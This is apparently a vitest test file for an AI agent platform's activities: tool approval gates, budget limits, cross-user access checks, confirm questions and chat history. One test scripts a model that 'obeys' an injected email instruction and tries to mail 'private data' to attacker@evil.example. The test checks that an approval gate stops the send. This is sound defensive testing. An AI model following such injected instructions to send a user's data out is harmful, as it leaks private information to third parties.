import { eq } from 'drizzle-orm';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { EnvSchema } from '@superagent/config';
import { PartialOutputError, type DecisionOutput, type DecisionRequest } from '@superagent/agent';
import { NotFoundError, answerQuestion, appendChatMessage, chatHistoryForModel, createChat, createTaskWithOutbox, decideIntent, getIntentForOwner, getAttempt, getQuestionForOwner, listChatMessages, listEvents, listMessages, pendingQuestionForChat, schema, type Db } from '@superagent/db';
import { createLogger } from '@superagent/observability';
import { verifiedConnectorTools } from '@superagent/policy';
import { BrowserBroker } from '@superagent/execution';
import { MemoryArtifactStore } from '@superagent/storage';
import { createActivities, ModelConfigError, type Deps } from '../src';
import { createTestDb, createUser } from '../../db/test/helpers';

const MODEL = 'anthropic/claude-haiku-5.5';
const LOCK = {
  GMAIL_SEND_EMAIL: { toolkit: 'gmail', version: '20260101_00', verifiedAt: '2026-10-01', params: ['recipient_email', 'subject', 'body', 'cc'] },
  GMAIL_FETCH_EMAILS: { toolkit: 'gmail', version: '20260101_00', verifiedAt: '2026-10-01', params: ['query', 'max_results'] },
};

function usage(cost: bigint | null = 1_000n) {
  return { inputTokens: 100, outputTokens: 20, cacheReadTokens: 0, cacheWriteTokens: 0, costNanos: cost, costStatus: cost === null ? 'unknown' : 'measured', generationId: 'gen_1', requestId: 'req_1', resolvedProvider: 'anthropic', providerAttempts: 1, responseModelId: MODEL } as const;
}

function toolCallOutput(id: string, toolName: string, input: unknown): DecisionOutput {
  return {
    finishReason: 'tool-calls',
    text: '',
    calls: [{ toolCallId: id, toolName, input, valid: true }],
    responseMessages: [{ role: 'assistant', content: [{ type: 'tool-call', toolCallId: id, toolName, input }] }],
    usage: { ...usage() },
  };
}

interface Harness {
  db: Db;
  deps: Deps;
  acts: ReturnType<typeof createActivities>;
  modelCalls: DecisionRequest[];
  connectorCalls: Array<{ slug: string; account: string; args: unknown }>;
  script: Array<DecisionOutput | Error>;
  connectorBehaviour: { mode: 'ok' | 'throw' | 'error' };
  close: () => Promise<void>;
}

async function harness(envOverrides: Record<string, string> = {}): Promise<Harness> {
  const { db, close } = await createTestDb();
  const env = EnvSchema.parse({
    AI_GATEWAY_API_KEY: 'test-key',
    AI_MODEL_PRIMARY: MODEL,
    COMPOSIO_API_KEY: 'test-composio',
    DATABASE_URL: 'postgres://unused',
    MAX_COST_PER_RUN: '0.25',
    MONTHLY_COST_LIMIT: '10',
    ...envOverrides,
  });
  const modelCalls: DecisionRequest[] = [];
  const connectorCalls: Harness['connectorCalls'] = [];
  const script: Harness['script'] = [];
  const connectorBehaviour: Harness['connectorBehaviour'] = { mode: 'ok' };
  const deps: Deps = {
    db,
    env,
    log: createLogger('test'),
    workerId: 'test-worker',
    store: () => new MemoryArtifactStore(),
    model: () => ({
      decide: async (req) => {
        modelCalls.push(req);
        const next = script.shift();
        if (!next) throw new Error('no scripted model output');
        if (next instanceof Error) throw next;
        return next;
      },
    }),
    catalog: async () => new Map([[MODEL, { id: MODEL, type: 'language', tags: ['tool-use', 'vision'], pricing: { input: '0.0000001', output: '0.0000005' } }]]),
    allowlist: () => [MODEL],
    connector: () => ({
      execute: async (_user, _tk, account, slug, args) => {
        connectorCalls.push({ slug, account, args });
        if (connectorBehaviour.mode === 'throw') throw new Error('ETIMEDOUT');
        if (connectorBehaviour.mode === 'error') return { ok: false, data: null, error: 'invalid recipient', logId: 'log_err' };
        return { ok: true, data: { id: 'msg_123' }, error: null, logId: 'log_1' };
      },
    }),
    connectorTools: () => verifiedConnectorTools(LOCK),
    workspaces: () => {
      throw new Error('E2B not used in these tests');
    },
    browser: new BrowserBroker(),
    configured: () => new Set(['database', 'gateway', 'composio', 'budget']),
  };
  return { db, deps, acts: createActivities(deps), modelCalls, connectorCalls, script, connectorBehaviour, close };
}

async function seed(h: Harness, opts: { readOnly?: boolean } = {}) {
  await createUser(h.db, 'alice');
  await createUser(h.db, 'mallory');
  const [conn] = await h.db
    .insert(schema.connectedAccounts)
    .values({ ownerId: 'alice', toolkit: 'gmail', composioUserId: 'sa_user_alice', composioConnectedAccountId: 'ca_alice', status: 'active', lastVerifiedAt: new Date() })
    .returning();
  const { task } = await createTaskWithOutbox(h.db, { ownerId: 'alice', prompt: 'Summarise my latest email', allowedDomains: [], retentionDays: 30, readOnly: opts.readOnly });
  return { taskId: task.id, ownerId: 'alice', connId: conn!.id };
}

const SEND_ARGS = { recipient_email: 'attacker@evil.example', subject: 'fwd', body: 'private data' };

describe('activities (PGlite + fake Gateway/Composio)', () => {
  let h: Harness;
  beforeEach(async () => {
    h = await harness();
  });
  afterEach(async () => {
    await h.close();
  });

  it('modelDecision persists one step and never re-calls the model for the same step', async () => {
    const { taskId, ownerId } = await seed(h);
    h.script.push(toolCallOutput('c1', 'gmail_fetch_emails', { max_results: 1 }));
    const first = await h.acts.modelDecision({ taskId, ownerId, step: 0 });
    const again = await h.acts.modelDecision({ taskId, ownerId, step: 0 });
    expect(first).toEqual({ kind: 'tools', step: 0, proposals: [{ toolCallId: `${taskId}:c1`, toolName: 'gmail_fetch_emails' }] });
    expect(again).toEqual(first);
    expect(h.modelCalls).toHaveLength(1);
    expect(h.modelCalls[0]!.tools.map((t) => t.name).sort()).toEqual(['ask_user', 'gmail_fetch_emails', 'gmail_send_email', 'memory_save', 'schedule_create', 'schedule_delete', 'schedule_list', 'schedule_pause', 'schedule_resume']);
    const usageRows = await h.db.select().from(schema.usageEntries);
    expect(usageRows).toHaveLength(1);
    expect(usageRows[0]).toMatchObject({ costStatus: 'measured', costNanos: 1_000n, requestId: 'gen_1' });
    const res = await h.db.select().from(schema.budgetReservations);
    expect(res[0]).toMatchObject({ status: 'settled', actualNanos: 1_000n });
  });

  it('read-only tasks never expose or allow external writes', async () => {
    const { taskId, ownerId } = await seed(h, { readOnly: true });
    h.script.push(toolCallOutput('c1', 'gmail_send_email', SEND_ARGS));
    await h.acts.modelDecision({ taskId, ownerId, step: 0 });
    expect(h.modelCalls[0]!.tools.map((t) => t.name)).not.toContain('gmail_send_email');
    const v = await h.acts.evaluateProposal({ taskId, ownerId, toolCallId: `${taskId}:c1`, readOnly: true });
    expect(v.verdict).toBe('deny');
    expect(h.connectorCalls).toHaveLength(0);
  });

  it('prompt injection that proposes a send only produces an approval request, never an execution', async () => {
    const { taskId, ownerId } = await seed(h);
    h.script.push(toolCallOutput('c1', 'gmail_fetch_emails', {}));
    await h.acts.modelDecision({ taskId, ownerId, step: 0 });
    await h.acts.evaluateProposal({ taskId, ownerId, toolCallId: `${taskId}:c1`, readOnly: false });
    h.connectorBehaviour.mode = 'ok';
    await h.acts.executeTool({ taskId, ownerId, toolCallId: `${taskId}:c1` });
    const msgs = await listMessages(h.db, ownerId, taskId);
    expect(JSON.stringify(msgs.at(-1)!.content)).toContain('UNTRUSTED GMAIL DATA START');

    // Model "obeys" an injected instruction in the email.
    h.script.push(toolCallOutput('c2', 'gmail_send_email', SEND_ARGS));
    await h.acts.modelDecision({ taskId, ownerId, step: 1 });
    const v = await h.acts.evaluateProposal({ taskId, ownerId, toolCallId: `${taskId}:c2`, readOnly: false });
    expect(v.verdict).toBe('needs_approval');
    expect(h.connectorCalls.map((c) => c.slug)).toEqual(['GMAIL_FETCH_EMAILS']);
    const events = await listEvents(h.db, ownerId, taskId);
    expect(events.find((e) => e.type === 'approval.requested')).toBeTruthy();
  });

  it('approved action executes exactly once with the bound account and exact args', async () => {
    const { taskId, ownerId } = await seed(h);
    h.script.push(toolCallOutput('c1', 'gmail_send_email', SEND_ARGS));
    await h.acts.modelDecision({ taskId, ownerId, step: 0 });
    const v = await h.acts.evaluateProposal({ taskId, ownerId, toolCallId: `${taskId}:c1`, readOnly: false });
    if (v.verdict !== 'needs_approval') throw new Error('expected approval');
    const ref = { taskId, ownerId, toolCallId: `${taskId}:c1`, intentId: v.intentId };
    expect(await h.acts.checkApproval(ref)).toEqual({ state: 'pending' });
    const intent = await getIntentForOwner(h.db, ownerId, v.intentId);
    await expect(decideIntent(h.db, 'mallory', v.intentId, { decision: 'approved', argsHash: intent.argsHash, nonce: intent.nonce })).rejects.toBeInstanceOf(NotFoundError);
    await decideIntent(h.db, ownerId, v.intentId, { decision: 'approved', argsHash: intent.argsHash, nonce: intent.nonce });
    expect(await h.acts.checkApproval(ref)).toEqual({ state: 'approved' });
    expect(await h.acts.executeApprovedAction(ref)).toMatchObject({ state: 'confirmed' });
    expect(await h.acts.executeApprovedAction(ref)).toMatchObject({ state: 'confirmed', summary: 'already confirmed' });
    expect(h.connectorCalls).toEqual([{ slug: 'GMAIL_SEND_EMAIL', account: 'ca_alice', args: SEND_ARGS }]);
  });

  it('tampering with stored args after approval blocks execution', async () => {
    const { taskId, ownerId } = await seed(h);
    h.script.push(toolCallOutput('c1', 'gmail_send_email', { ...SEND_ARGS, recipient_email: 'friend@example.com' }));
    await h.acts.modelDecision({ taskId, ownerId, step: 0 });
    const v = await h.acts.evaluateProposal({ taskId, ownerId, toolCallId: `${taskId}:c1`, readOnly: false });
    if (v.verdict !== 'needs_approval') throw new Error('expected approval');
    const intent = await getIntentForOwner(h.db, ownerId, v.intentId);
    await decideIntent(h.db, ownerId, v.intentId, { decision: 'approved', argsHash: intent.argsHash, nonce: intent.nonce });
    await h.db.update(schema.actionIntents).set({ args: SEND_ARGS }).where(eq(schema.actionIntents.id, v.intentId));
    const out = await h.acts.executeApprovedAction({ taskId, ownerId, toolCallId: `${taskId}:c1`, intentId: v.intentId });
    expect(out.state).toBe('skipped');
    expect(h.connectorCalls).toHaveLength(0);
  });

  it('an ambiguous connector failure is recorded as unknown and never re-sent', async () => {
    const { taskId, ownerId } = await seed(h);
    h.script.push(toolCallOutput('c1', 'gmail_send_email', SEND_ARGS));
    await h.acts.modelDecision({ taskId, ownerId, step: 0 });
    const v = await h.acts.evaluateProposal({ taskId, ownerId, toolCallId: `${taskId}:c1`, readOnly: false });
    if (v.verdict !== 'needs_approval') throw new Error('expected approval');
    const intent = await getIntentForOwner(h.db, ownerId, v.intentId);
    await decideIntent(h.db, ownerId, v.intentId, { decision: 'approved', argsHash: intent.argsHash, nonce: intent.nonce });
    h.connectorBehaviour.mode = 'throw';
    const ref = { taskId, ownerId, toolCallId: `${taskId}:c1`, intentId: v.intentId };
    expect((await h.acts.executeApprovedAction(ref)).state).toBe('unknown');
    expect((await getAttempt(h.db, ownerId, v.intentId))?.state).toBe('unknown');
    expect((await h.acts.executeApprovedAction(ref)).state).toBe('unknown');
    expect(h.connectorCalls).toHaveLength(1);
    const events = await listEvents(h.db, ownerId, taskId);
    expect(events.some((e) => e.type === 'action.unknown_outcome')).toBe(true);
  });

  it('a disconnected account between approval and execution fails closed', async () => {
    const { taskId, ownerId, connId } = await seed(h);
    h.script.push(toolCallOutput('c1', 'gmail_send_email', SEND_ARGS));
    await h.acts.modelDecision({ taskId, ownerId, step: 0 });
    const v = await h.acts.evaluateProposal({ taskId, ownerId, toolCallId: `${taskId}:c1`, readOnly: false });
    if (v.verdict !== 'needs_approval') throw new Error('expected approval');
    const intent = await getIntentForOwner(h.db, ownerId, v.intentId);
    await decideIntent(h.db, ownerId, v.intentId, { decision: 'approved', argsHash: intent.argsHash, nonce: intent.nonce });
    await h.db.update(schema.connectedAccounts).set({ status: 'revoked' }).where(eq(schema.connectedAccounts.id, connId));
    expect((await h.acts.executeApprovedAction({ taskId, ownerId, toolCallId: `${taskId}:c1`, intentId: v.intentId })).state).toBe('failed');
    expect(h.connectorCalls).toHaveLength(0);
  });

  it('another user cannot evaluate or execute a task’s tool calls', async () => {
    const { taskId } = await seed(h);
    h.script.push(toolCallOutput('c1', 'gmail_fetch_emails', {}));
    await h.acts.modelDecision({ taskId, ownerId: 'alice', step: 0 });
    await expect(h.acts.evaluateProposal({ taskId, ownerId: 'mallory', toolCallId: `${taskId}:c1`, readOnly: false })).rejects.toBeInstanceOf(NotFoundError);
    await expect(h.acts.executeTool({ taskId, ownerId: 'mallory', toolCallId: `${taskId}:c1` })).rejects.toBeInstanceOf(NotFoundError);
    await expect(h.acts.modelDecision({ taskId, ownerId: 'mallory', step: 1 })).rejects.toBeInstanceOf(NotFoundError);
  });

  it('partial/truncated model output is rejected but its cost is still recorded', async () => {
    const { taskId, ownerId } = await seed(h);
    h.script.push(new PartialOutputError('model finished with "length"', { ...usage(2_000n) }));
    const r = await h.acts.modelDecision({ taskId, ownerId, step: 0 });
    expect(r.kind).toBe('error');
    const u = await h.db.select().from(schema.usageEntries);
    expect(u[0]).toMatchObject({ costNanos: 2_000n, costStatus: 'measured' });
  });

  it('unknown cost keeps the conservative estimate charged', async () => {
    const { taskId, ownerId } = await seed(h);
    h.script.push({ ...toolCallOutput('c1', 'memory_save', { content: 'prefers metric units' }), usage: { ...usage(null) } });
    await h.acts.modelDecision({ taskId, ownerId, step: 0 });
    const [r] = await h.db.select().from(schema.budgetReservations);
    expect(r!.actualNanos).toBe(r!.amountNanos);
    const [u] = await h.db.select().from(schema.usageEntries);
    expect(u!.costStatus).toBe('estimated');
  });
});

describe('activities budget and model gating', () => {
  it('blocks the model call when the per-run budget cannot cover the estimate', async () => {
    const h = await harness({ MAX_COST_PER_RUN: '0.000001' });
    try {
      const { taskId, ownerId } = await seed(h);
      const r = await h.acts.modelDecision({ taskId, ownerId, step: 0 });
      expect(r).toMatchObject({ kind: 'error' });
      expect(h.modelCalls).toHaveLength(0);
      expect((await listEvents(h.db, ownerId, taskId)).some((e) => e.type === 'budget.blocked')).toBe(true);
    } finally {
      await h.close();
    }
  });

  it('refuses a model that is not on the allowlist / catalogue', async () => {
    const h = await harness({ AI_MODEL_PRIMARY: 'openai/not-a-real-model' });
    try {
      const { taskId, ownerId } = await seed(h);
      await expect(h.acts.modelDecision({ taskId, ownerId, step: 0 })).rejects.toBeInstanceOf(ModelConfigError);
      expect(h.modelCalls).toHaveLength(0);
    } finally {
      await h.close();
    }
  });

  it('live execution requires budget limits to be configured', async () => {
    const h = await harness({ MAX_COST_PER_RUN: '', MONTHLY_COST_LIMIT: '' });
    try {
      const { taskId, ownerId } = await seed(h);
      expect(await h.acts.modelDecision({ taskId, ownerId, step: 0 })).toMatchObject({ kind: 'error' });
      expect(h.modelCalls).toHaveLength(0);
    } finally {
      await h.close();
    }
  });
});

describe('chat questions, confirm gates and chat projection', () => {
  let h: Harness;
  beforeEach(async () => {
    h = await harness();
  });
  afterEach(async () => {
    await h.close();
  });

  async function chatTask(origin: 'user' | 'schedule' = 'user') {
    await createUser(h.db, 'alice');
    await createUser(h.db, 'mallory');
    const chat = await createChat(h.db, 'alice');
    const { task } = await createTaskWithOutbox(h.db, { ownerId: 'alice', prompt: 'Help me', allowedDomains: [], retentionDays: 30, chatId: chat.id, timezone: 'America/Toronto', origin, readOnly: origin === 'schedule' });
    return { chatId: chat.id, taskId: task.id, ownerId: 'alice' };
  }

  async function propose(taskId: string, ownerId: string, id: string, tool: string, input: unknown, step = 0) {
    h.script.push(toolCallOutput(id, tool, input));
    await h.acts.modelDecision({ taskId, ownerId, step });
    return h.acts.evaluateProposal({ taskId, ownerId, toolCallId: `${taskId}:${id}`, readOnly: false });
  }

  it('ask_user waits for a persisted answer and returns the chosen labels to the model', async () => {
    const { taskId, ownerId, chatId } = await chatTask();
    const v = await propose(taskId, ownerId, 'q1', 'ask_user', { question: 'Focus on?', kind: 'single', options: [{ id: 'a', label: 'Email' }, { id: 'b', label: 'Calendar' }] });
    expect(v.verdict).toBe('needs_answer');
    if (v.verdict !== 'needs_answer') return;
    expect(v.gate).toBe(false);
    const ref = { taskId, ownerId, toolCallId: `${taskId}:q1`, questionId: v.questionId };
    await h.acts.prepareForQuestionWait(ref);
    expect((await pendingQuestionForChat(h.db, ownerId, chatId))?.id).toBe(v.questionId);
    expect(await h.acts.checkQuestion(ref)).toEqual({ state: 'pending' });

    await expect(answerQuestion(h.db, 'mallory', v.questionId, { choices: ['a'] })).rejects.toBeInstanceOf(NotFoundError);
    await expect(answerQuestion(h.db, ownerId, v.questionId, { choices: ['zzz'] })).rejects.toThrow(/unknown option/);
    await answerQuestion(h.db, ownerId, v.questionId, { choices: ['b'] });
    await expect(answerQuestion(h.db, ownerId, v.questionId, { choices: ['a'] })).rejects.toThrow(/already answered/);
    const outbox = await h.db.select().from(schema.workflowOutbox).where(eq(schema.workflowOutbox.kind, 'signal_question'));
    expect(outbox).toHaveLength(1);

    expect(await h.acts.checkQuestion(ref)).toEqual({ state: 'answered', confirmed: false });
    expect(await h.acts.recordQuestionOutcome({ ...ref, gate: false, state: 'answered' })).toEqual({ runGatedTool: false });
    const msgs = await listMessages(h.db, ownerId, taskId);
    expect(JSON.stringify(msgs.at(-1)!.content)).toContain('Selected: Calendar');
    const events = await listEvents(h.db, ownerId, taskId);
    expect(events.map((e) => e.type)).toEqual(expect.arrayContaining(['question.asked', 'question.answered']));
  });

  it('a choice question without two options is denied so the model rephrases', async () => {
    const { taskId, ownerId } = await chatTask();
    const v = await propose(taskId, ownerId, 'q2', 'ask_user', { question: 'Pick', kind: 'multi', options: [{ id: 'a', label: 'Only' }] });
    expect(v.verdict).toBe('deny');
  });

  it('schedule_create only runs after an explicit Yes, and posts into the creating chat', async () => {
    const { taskId, ownerId, chatId } = await chatTask();
    const input = { name: 'Inbox check', prompt: 'Check my inbox for important mail', everyMinutes: 15 };

    const no = await propose(taskId, ownerId, 's1', 'schedule_create', input);
    expect(no.verdict).toBe('needs_answer');
    if (no.verdict !== 'needs_answer') return;
    expect(no.gate).toBe(true);
    const q = await getQuestionForOwner(h.db, ownerId, no.questionId);
    expect(q.kind).toBe('confirm');
    expect(q.prompt).toContain('Inbox check');
    expect(q.prompt).toContain('every 15 minutes');
    await answerQuestion(h.db, ownerId, no.questionId, { choices: [], text: 'nah, not now' });
    const refNo = { taskId, ownerId, toolCallId: `${taskId}:s1`, questionId: no.questionId };
    expect(await h.acts.checkQuestion(refNo)).toEqual({ state: 'answered', confirmed: false });
    expect(await h.acts.recordQuestionOutcome({ ...refNo, gate: true, state: 'answered' })).toEqual({ runGatedTool: false });
    expect(await h.db.select().from(schema.schedules)).toHaveLength(0);

    const yes = await propose(taskId, ownerId, 's2', 'schedule_create', input, 1);
    if (yes.verdict !== 'needs_answer') throw new Error('expected a confirm gate');
    await answerQuestion(h.db, ownerId, yes.questionId, { choices: ['yes'] });
    const refYes = { taskId, ownerId, toolCallId: `${taskId}:s2`, questionId: yes.questionId };
    expect(await h.acts.recordQuestionOutcome({ ...refYes, gate: true, state: 'answered' })).toEqual({ runGatedTool: true });
    const r = await h.acts.executeTool({ taskId, ownerId, toolCallId: `${taskId}:s2` });
    expect(r.ok).toBe(true);
    const rows = await h.db.select().from(schema.schedules);
    expect(rows).toHaveLength(1);
    expect(rows[0]).toMatchObject({ name: 'Inbox check', chatId, timezone: 'America/Toronto', readOnly: true, overlapPolicy: 'SKIP', state: 'pending_create' });
    expect(await h.db.select().from(schema.workflowOutbox).where(eq(schema.workflowOutbox.kind, 'create_schedule'))).toHaveLength(1);
  });

  it('an expired question records a refusal and never runs the gated tool', async () => {
    const { taskId, ownerId } = await chatTask();
    const v = await propose(taskId, ownerId, 's3', 'schedule_create', { name: 'x', prompt: 'y', cron: '0 9 * * 1-5' });
    if (v.verdict !== 'needs_answer') throw new Error('expected a confirm gate');
    const ref = { taskId, ownerId, toolCallId: `${taskId}:s3`, questionId: v.questionId };
    expect(await h.acts.recordQuestionOutcome({ ...ref, gate: true, state: 'expired' })).toEqual({ runGatedTool: false });
    expect((await getQuestionForOwner(h.db, ownerId, v.questionId)).status).toBe('expired');
    await expect(answerQuestion(h.db, ownerId, v.questionId, { choices: ['yes'] })).rejects.toThrow(/already expired/);
  });

  it('routines cannot create or change routines', async () => {
    const { taskId, ownerId } = await chatTask('schedule');
    h.script.push(toolCallOutput('r1', 'schedule_list', {}));
    await h.acts.modelDecision({ taskId, ownerId, step: 0 });
    expect(h.modelCalls[0]!.tools.map((t) => t.name)).not.toContain('schedule_create');
    const v = await h.acts.evaluateProposal({ taskId, ownerId, toolCallId: `${taskId}:r1`, readOnly: true });
    expect(v).toMatchObject({ verdict: 'deny', reason: 'routines cannot manage routines' });
  });

  it('finalizeTask posts the run (tool trace + answer) to its chat exactly once', async () => {
    const { taskId, ownerId, chatId } = await chatTask();
    h.script.push(toolCallOutput('m1', 'memory_save', { content: 'Prefers short answers' }));
    await h.acts.modelDecision({ taskId, ownerId, step: 0 });
    await h.acts.evaluateProposal({ taskId, ownerId, toolCallId: `${taskId}:m1`, readOnly: false });
    await h.acts.executeTool({ taskId, ownerId, toolCallId: `${taskId}:m1` });
    h.script.push({ finishReason: 'stop', text: 'Saved your preference.', calls: [], responseMessages: [{ role: 'assistant', content: 'Saved your preference.' }], usage: usage() });
    await h.acts.modelDecision({ taskId, ownerId, step: 1 });
    await h.acts.finalizeTask({ taskId, ownerId, status: 'completed' });
    await h.acts.finalizeTask({ taskId, ownerId, status: 'completed' });
    const rows = (await listChatMessages(h.db, ownerId, chatId)).filter((m) => m.role === 'assistant');
    expect(rows).toHaveLength(1);
    expect(rows[0]!.taskId).toBe(taskId);
    expect(rows[0]!.content.map((p) => p.type)).toEqual(['tool_use', 'tool_result', 'text']);
    expect(rows[0]!.content.at(-1)).toEqual({ type: 'text', text: 'Saved your preference.' });
  });

  it('a new run in a chat carries earlier turns as model context, oldest first', async () => {
    await createUser(h.db, 'alice');
    const chat = await createChat(h.db, 'alice');
    await appendChatMessage(h.db, { ownerId: 'alice', chatId: chat.id, role: 'user', content: [{ type: 'text', text: 'My name is Ada.' }] });
    await appendChatMessage(h.db, {
      ownerId: 'alice',
      chatId: chat.id,
      role: 'assistant',
      content: [{ type: 'tool_use', id: 'x', name: 'memory_save', args: {} }, { type: 'tool_result', toolUseId: 'x', name: 'memory_save', ok: true, text: 'saved', images: [] }, { type: 'text', text: 'Nice to meet you, Ada.' }],
    });
    await appendChatMessage(h.db, { ownerId: 'alice', chatId: chat.id, role: 'system', content: [{ type: 'text', text: 'Routine paused.' }] });
    const history = await chatHistoryForModel(h.db, 'alice', chat.id);
    expect(history).toEqual([
      { role: 'user', content: 'My name is Ada.' },
      { role: 'assistant', content: 'Nice to meet you, Ada.\n\n[Tools actually used in this turn: memory_save (succeeded)]' },
    ]);
    const { task } = await createTaskWithOutbox(h.db, { ownerId: 'alice', prompt: 'What is my name?', allowedDomains: [], retentionDays: 30, chatId: chat.id, history });
    const msgs = await listMessages(h.db, 'alice', task.id);
    expect(msgs.map((m) => [m.kind, (m.content as { content: string }).content])).toEqual([
      ['user', 'My name is Ada.'],
      ['assistant', 'Nice to meet you, Ada.\n\n[Tools actually used in this turn: memory_save (succeeded)]'],
      ['user', 'What is my name?'],
    ]);
  });
});
